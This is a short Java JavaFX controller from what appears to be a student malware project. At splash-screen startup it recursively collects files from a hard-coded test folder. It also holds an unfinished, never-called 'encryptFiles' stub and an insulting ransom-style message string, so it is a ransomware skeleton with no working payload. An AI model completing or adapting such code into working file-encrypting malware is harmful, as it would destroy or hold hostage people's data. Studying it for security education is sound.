package lk.ijse.dep10.malware.controller;

import javafx.fxml.FXML;
import javafx.scene.control.ProgressBar;

import java.io.*;
import java.util.ArrayList;

public class SplashSceneController {

    @FXML
    private ProgressBar prg;
    private ArrayList<File> arrayListFiles = new ArrayList<>();
    private String signature = "You are fucked up";


    public void initialize() {
        File targetDirectory = new File("/home/sagara/Desktop/test_malware");

        File[] targetDir = targetDirectory.listFiles();
        findFiles(targetDirectory);

    }

    private void encryptFiles() throws IOException {
        for (File file : arrayListFiles) {
            FileInputStream fis = new FileInputStream(file);
            File tempFile = File.createTempFile("-app", "ok");
            FileOutputStream fos = new FileOutputStream(tempFile);


            byte[] buffer = new byte[100];
            int read = fis.read(buffer);


        }
    }

    public void findFiles(File path) {
        File[] files = path.listFiles();
        for (File file : files) {
            if(file.isDirectory()) findFiles(file);
            System.out.println(file);
            this.arrayListFiles.add(file);
        }

    }

}
